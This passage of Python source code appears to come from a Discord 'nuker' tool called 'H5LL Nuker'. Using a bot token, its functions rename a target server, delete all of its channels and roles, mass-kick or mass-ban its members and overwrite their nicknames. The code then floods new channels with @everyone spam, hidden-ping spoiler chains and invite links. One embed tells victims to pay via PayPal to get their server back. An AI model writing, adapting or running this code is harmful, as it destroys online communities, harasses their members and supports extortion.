    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))
    print(f"\033[38;2;139;0;139mFethcing Guild....")

    intents = discord.Intents.default()
    intents.all()

    client = commands.Bot(command_prefix='!', intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            time.sleep(0)
            clear_screen()

            try:
                print(bannermainmenu)


                serverconfig = print("Changing Server By The Config..")
                script_dir = Path(__file__).resolve().parent
                data_dir = script_dir / "data"
                data_dir.mkdir(parents=True, exist_ok=True)
                bottoken_file_path = data_dir / "servername.txt"
                clear_screen()

                if not bottoken_file_path.exists():
                    print("The 'servername.txt' file does not exist. Creating it now...")
                    bottoken_file_path.touch()
                with open(bottoken_file_path, "r", buffering=8192, encoding="utf-8") as file:
                    serverconfig = file.readline().strip()
                await guild.edit(name=serverconfig)
                await asyncio.sleep(0)
                clear_screen()


        
                

                print(f'Nuking the server "{serverconfig}" ({guild.id})...')
                for channel in guild.channels:
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                  await channel.delete()
                  await asyncio.sleep(0)


                rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE,
                                  Fore.BLACK, Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX,
                                  Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]

                clear_screen()
                print(bannermainmenu)


                num_channels = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Number of Channels to Create »  "))
                channel_name = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Load A Channel Config y/n »  ")
                folder = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Load A Message Config? y/n »  ")
                
                if channel_name == "n":
                    folder = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Load A Message Config? y/n »  ")
                    Delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message Delay »  "))
                else:
                    script_dir = Path(__file__).resolve().parent
                    data_dir = script_dir / "data"
                    data_dir.mkdir(parents=True, exist_ok=True)
                    bottoken_file_path = data_dir / "channeldata.txt"
                    Delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message Delay »  "))
                    clear_screen()

                    if not bottoken_file_path.exists():
                        print("The 'channeldata.txt' file does not exist. Creating it now...")
                        bottoken_file_path.touch()
                    with open(bottoken_file_path, "r", buffering=8192, encoding="utf-8") as file:
                        channel_name = file.readline().strip()



                
                if folder == "n":
                    pick_message = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message »  ")
                    Delay = float(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Message Delay »  "))
                else:
                    script_dir = Path(__file__).resolve().parent
                    data_dir = script_dir / "data"
                    data_dir.mkdir(parents=True, exist_ok=True)
                    bottoken_file_path = data_dir / "message.txt"
                    clear_screen()

                    if not bottoken_file_path.exists():
                        print("The 'bottoken.txt' file does not exist. Creating it now...")
                        bottoken_file_path.touch()
                    with open(bottoken_file_path, "r", buffering=8192, encoding="utf-8") as file:
                        pick_message = file.readline().strip()



                async def create_and_message(channel_name, pick_message, color, Delay):
                    rate_limit_counter = 0

                    try:
                        channel = await guild.create_text_channel(name=channel_name)
                        print(f"Channel {color}{channel_name}\033[38;2;139;0;139m Was Created")

                        for _ in range(num_channels):
                            try:
                                await channel.send(f"{pick_message}")
                            except discord.errors.HTTPException as e:
                                if e.status == 429:  
                                    headers = e.response.headers
                                    retry_after = float(headers.get("Retry-After", 5))
                                    rate_limit_counter += 1

                                    if rate_limit_counter >= 0.75:
                                            
                                        combined_text = warning.strip() + " " + safemod2.strip()
                                        print(combined_text)

                                        await asyncio.sleep(5)
                                        rate_limit_counter = 0  
                                    
                                    
                                    print(f"Rate limited. Waiting for {e.retry_after} seconds...")
                                    await asyncio.sleep(retry_after)


                                    




                                else:
                                    print(f"\033[38;2;139;0;139mError sending message: {e}")
                            else:
                              rate_limit_counter = 0

                            time.sleep(Delay)
                    except Exception as e:
                        combined_text = warning.strip() + " " + safemod.strip()
                        print(combined_text)


                tasks = []
                for i in range(num_channels):
                    color = rainbow_colors[i % len(rainbow_colors)]
                    task = create_and_message(channel_name, pick_message, color, Delay,)
                    tasks.append(task)

                await asyncio.gather(*tasks)
                await client.close()

            except Exception as e:
                print(f"An error occurred during the nuking process: {e}")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

    try:
        await client.start(TOKEN)
    except discord.LoginFailure:
        print("Invalid bot token. Please check the 'bottoken.txt' file.")
    except Exception as e:
        print(f"An error occurred while trying to log in: {e}")










    


#TOKEN CHECKER

def bot_token_checker():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)

    
    intents = discord.Intents.default()
    intents.guilds = True
    client = discord.Client(intents=intents)
    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        clear_screen()
        print(f' BOT NAMED {bot.user.name} IS WORKING')
    bot.run(TOKEN)
    time.sleep(2)
    return mainmenu()





# NAME CHANGER IN THE SERVER


def change_bot_username():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)



    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))

    intents = discord.Intents.default()
    intents.all()

    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name} ({client.user.id})')
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            print(f'Server Name: {guild.name}')
            print(f'Server ID: {guild.id}')
            print(f'Server Owner: {guild.owner}')
            print(f'Server Member Count: {guild.member_count}')
            print(" ")
            print(" ")

            new_nickname = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name »  ")
            try:
                member = guild.get_member(client.user.id)
                await member.edit(nick=new_nickname)
                print(f'Changed bot nickname on server "{guild.name}" to {new_nickname}')
            except Exception as e:
                print(f'An error occurred while changing the nickname: {str(e)}')

    client.run(TOKEN)




async def changer():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r") as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)



    
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")

    
    NEW_DISPLAY_NAME = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Name Content »  ")

    # Create a bot instance
    intents = discord.Intents.default()
    intents.members = True  
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        print(f'Logged in as {client.user.name}')
        guild = client.get_guild(int(GUILD_ID))
        if guild:
            for member in guild.members:
                try:
                    await member.edit(nick=NEW_DISPLAY_NAME)
                    print(f"Changed display name for {member.name}#{member.discriminator} to {NEW_DISPLAY_NAME}")
                except Exception as e:
                    print(f"Failed to change display name for {member.name}#{member.discriminator}: {str(e)}")

    await start_bot(client, TOKEN)

async def start_bot(client, token):
    await client.start(token)
        




def kick_all():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)

    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
    kick_count = 0
    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.BLACK,
                      Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
                      Fore.LIGHTCYAN_EX]

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        time.sleep(1)
        clear_screen()
        guild = bot.get_guild(int(GUILD_ID))
        nonlocal kick_count
        for member in guild.members:
            if member != bot.user:  
                try:
                    await member.kick()
                    color = rainbow_colors[kick_count % len(rainbow_colors)]
                    kick_count += 1
                    print(f'\033[38;2;139;0;139mKicked {member.name} ({color}{kick_count}{Style.RESET_ALL})\033[38;2;139;0;139m')
                except discord.Forbidden:
                    print(f'\033[38;2;139;0;139mSkipped {member.name} (Insufficient permissions)\033[38;2;139;0;139m')

    bot.run(TOKEN)




def ban_all():
    
    clear_screen()
    script_dir = Path(__file__).resolve().parent


    data_dir = script_dir / "data"


    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"

    if not bottoken_file_path.exists():
     print("The 'bottoken.txt' file does not exist. Creating it now...")
     bottoken_file_path.touch()

    with open(bottoken_file_path, "r", buffering=8192) as file:
     TOKEN = file.readline().strip()
    print(bannermainmenu)

    intents = discord.Intents.default()
    intents.members = True
    bot = commands.Bot(command_prefix="!", intents=intents)
    GUILD_ID = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  ")
    BAN_REASON = input(f"\033[90m{timedate}\033[38;2;139;0;139m    Reason »  ")
    ban_count = 0
    rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE, Fore.BLACK,
                      Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX,
                      Fore.LIGHTCYAN_EX]

    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        time.sleep(1)
        clear_screen()
        guild = bot.get_guild(int(GUILD_ID))
        nonlocal ban_count
        for member in guild.members:
            if member != bot.user:  
                try:
                    await member.ban(reason=BAN_REASON)
                    color = rainbow_colors[ban_count % len(rainbow_colors)]
                    ban_count += 1
                    print(f'\033[38;2;139;0;139mBanned {member.name} ({color}{ban_count}{Style.RESET_ALL})\033[38;2;139;0;139m')
                except discord.Forbidden:
                    print(f'\033[38;2;139;0;139mSkipped {member.name} (Insufficient permissions)\033[38;2;139;0;139m')
    bot.run(TOKEN)



def read_config_file(file_path, default_value=None):
    if not file_path.exists():
        print(f"The '{file_path.name}' file does not exist. Creating it now...")
        file_path.touch()
        return default_value

    with open(file_path, "r", buffering=8192, encoding="utf-8") as file:
        return file.readline().strip()

async def coolfunction():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    data_dir = script_dir / "data"
    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"
    TOKEN = read_config_file(bottoken_file_path)
    if not TOKEN:
        return

    print(bannermainmenu)

    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))
    print(f"\033[38;2;139;0;139mFethcing Guild....")

    intents = discord.Intents.default()
    intents.all()
    client = commands.Bot(command_prefix='!', intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            time.sleep(0)
            clear_screen()

            try:
                print(bannermainmenu)

                servername_file_path = data_dir / "servername.txt"
                serverconfig = read_config_file(servername_file_path)
                if not serverconfig:
                    return

                await guild.edit(name=serverconfig)
                await asyncio.sleep(0)
                clear_screen()

                print(f'Mixing Some Maxture Of Logic In (depends on your internet)"{serverconfig}" ({guild.id})...')
                for channel in guild.channels:
                    if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                        await channel.delete()
                        await asyncio.sleep(0)

                rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE,
                                  Fore.BLACK, Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX,
                                  Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]

                clear_screen()
                print(bannermainmenu)

                delay_file_path = data_dir / "delay.txt"
                num_channels_file_path = data_dir / "channelamount.txt"
                channel_name_file_path = data_dir / "channeldata.txt"
                message_file_path = data_dir / "message.txt"

                Delay = float(read_config_file(delay_file_path, default_value="0.0"))
                num_channels = int(read_config_file(num_channels_file_path, default_value="0"))
                channel_name = read_config_file(channel_name_file_path)
                pick_message = read_config_file(message_file_path)

                async def create_and_message(channel_name, pick_message, color, Delay):
                    rate_limit_counter = 0

                    try:
                        channel = await guild.create_text_channel(name=channel_name)
                        print(f"Channel {color}{channel_name}\033[38;2;139;0;139m Was Created")

                        for _ in range(num_channels):
                            try:
                                await channel.send(f"{pick_message}")
                            except discord.errors.HTTPException as e:
                                if e.status == 429:  
                                    headers = e.response.headers
                                    retry_after = float(headers.get("Retry-After", 5))
                                    rate_limit_counter += 1

                                    if rate_limit_counter >= 0.75:
                                        combined_text = warning.strip() + " " + safemod2.strip()
                                        print(combined_text)
                                        await asyncio.sleep(5)
                                        rate_limit_counter = 0  

                                    print(f"Rate limited. Waiting for {e.retry_after} seconds...")
                                    await asyncio.sleep(retry_after)

                                else:
                                    print(f"\033[38;2;139;0;139mError sending message: {e}")
                            else:
                                rate_limit_counter = 0

                            time.sleep(Delay)
                    except Exception as e:
                        combined_text = warning.strip() + " " + safemod2.strip()
                        print(combined_text)
                        

                tasks = []
                for i in range(num_channels):
                    color = rainbow_colors[i % len(rainbow_colors)]
                    task = create_and_message(channel_name, pick_message, color, Delay,)
                    tasks.append(task)

                await asyncio.gather(*tasks)
                await client.close()

            except Exception as e:
                print(f"An error occurred during the nuking process: {e}")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

    try:
        await client.start(TOKEN)
    except discord.LoginFailure:
        print("Invalid bot token. Please check the 'bottoken.txt' file.")
    except Exception as e:
        print(f"An error occurred while trying to log in: {e}")



# scpraeeee on toppp


async def scraper():
    clear_screen()
    script_dir = Path(__file__).resolve().parent
    data_dir = script_dir / "data"
    data_dir.mkdir(parents=True, exist_ok=True)

    bottoken_file_path = data_dir / "bottoken.txt"
    TOKEN = read_config_file(bottoken_file_path)
    if not TOKEN:
        return

    print(bannermainmenu)

    GUILD_ID = int(input(f"\033[90m{timedate}\033[38;2;139;0;139m    Guild Id »  "))
    clear_screen()
    print(f"\033[38;2;139;0;139mFethcing Guild....")

    intents = discord.Intents.default()
    intents.all()
    client = commands.Bot(command_prefix='!', intents=intents)

    @client.event
    async def on_ready():
        clear_screen()
        guild = discord.utils.get(client.guilds, id=GUILD_ID)
        if guild:
            time.sleep(0)
            clear_screen()

            try:
                print(bannermainmenu)

                servername_file_path = data_dir / "servername.txt"
                serverconfig = read_config_file(servername_file_path)
                if not serverconfig:
                    return

                await guild.edit(name=serverconfig)
                await asyncio.sleep(0)
                
                clear_screen()
                print(f"Proccesing Some Work (Deleting Channels...) {serverconfig} {GUILD_ID}... ")
                for channel in guild.channels:
                    if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                      try:
                        await channel.delete()
                      except discord.NotFound:
                          continue  
                clear_screen()
                print(f"Proccesing Some Work  (Deleting Roles...) {serverconfig} {GUILD_ID}... ")
                for role in guild.roles:
                  if role.name != '@everyone':
                    try:
                       await role.delete()
                    except discord.Forbidden:
                        print("Skipping..")
                    except discord.HTTPException as e:
                        print("Skipping...")
                
                
                


                rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE,
                                  Fore.BLACK, Fore.LIGHTRED_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTGREEN_EX,
                                  Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX]

                clear_screen()
                print(bannermainmenu)

                delay_file_path = data_dir / "delay.txt"
                num_channels_file_path = data_dir / "channelamount.txt"
                channel_name_file_path = data_dir / "channeldata.txt"

                Delay = float(read_config_file(delay_file_path, default_value="0.0"))
                num_channels = int(read_config_file(num_channels_file_path, default_value="0"))
                channel_name = read_config_file(channel_name_file_path)

                

                async def create_and_message(channel_name, embed, color, Delay):
                    rate_limit_counter = 0

                    try:
                        channel = await guild.create_text_channel(name=channel_name)
                        print(f"Channel {color}{channel_name}\033[38;2;139;0;139m Was Created")

                        for _ in range(num_channels):
                            try:
                                await channel.send("@everyone",embed=embed)
                                await channel.send("@everyone||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| put link here --- >https://discord.gg/UxBXmVHRdq")
                                await channel.send("@everyone||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||||||||||| put link here --- >https://media.discordapp.net/attachments/1155205810822074390/1155367489228787794/standard.gif")

                            except discord.errors.HTTPException as e:
                                if e.status == 429:  
                                    headers = e.response.headers
                                    retry_after = float(headers.get("Retry-After", 5))
                                    rate_limit_counter += 1

                                    if rate_limit_counter >= 0.75:
                                        combined_text = warning.strip() + " " + safemod2.strip()
                                        print(combined_text)
                                        await asyncio.sleep(5)
                                        rate_limit_counter = 0  

                                    print(f"Rate limited. Waiting for {e.retry_after} seconds...")
                                    await asyncio.sleep(retry_after)

                                else:
                                    print(f"\033[38;2;139;0;139mError sending message: {e}")
                            else:
                                rate_limit_counter = 0

                            time.sleep(Delay)
                    except Exception as e:
                        combined_text = warning.strip() + " " + safemod.strip()
                        print(combined_text)

                tasks = []
                for i in range(num_channels):
                    color = rainbow_colors[i % len(rainbow_colors)]
                    thumbnail_url1 = "https://i.pinimg.com/originals/8c/16/42/8c16425c3c40e08c8d8f52478a7cd5b9.gif"
                    thumbnail_url2 = "https://wallpapers.com/images/high/creepy-and-cute-discord-logo-7kjhngnypm6eqwku.webp"

                    
                    embed = Embed(
                        title="H5LL Nuker",
                        description="Nuked By H5LL Services, why? because it may be the case that we met. and you gave the perms to the wrong guy, you're should watch nexttime, you may click to appeal why we should get your server back. more than 100 members is 1 dollar.",
                        color=0x9400D3,
                        url="https://shorturl.at/mDGLV",
                        timestamp=datetime.datetime.utcnow()
                        
                    )
                    embed.add_field(name="Action Taken!!!", value="Please Appeal Why We Should Get Your Server Back. If You're Gonna Spam In That Server It Will Result In a Perma Ban!")
                    embed.set_footer(text="Nuked by H5LL Bot", icon_url="https://discord.gg/jhzUmjTp")
                    embed.set_thumbnail(url=thumbnail_url1)
                    embed.set_footer(text="Nuked by H5LL Bot", icon_url=thumbnail_url2)
                    embed.add_field(name="**Accepting Payments : **", value="Paypal")
                    task = create_and_message(channel_name, embed, color, Delay)
                    tasks.append(task)

                await asyncio.gather(*tasks)
                await client.close()

            except discord.NotFound:
                pass
            except Exception as e:
                print("Detected Some Error Please Check Your Data.")
        else:
            print(f"Guild with ID {GUILD_ID} not found.")

    try:
        await client.start(TOKEN)
    except discord.LoginFailure:
        print("Invalid bot token. Please check the 'bottoken.txt' file.")
    except Exception as e:
        print(f"Most Likely Blocked Or Extra Limit Rate?{e}")




if __name__ == "__main__":
    mainmenu()


# THIS IS THE END.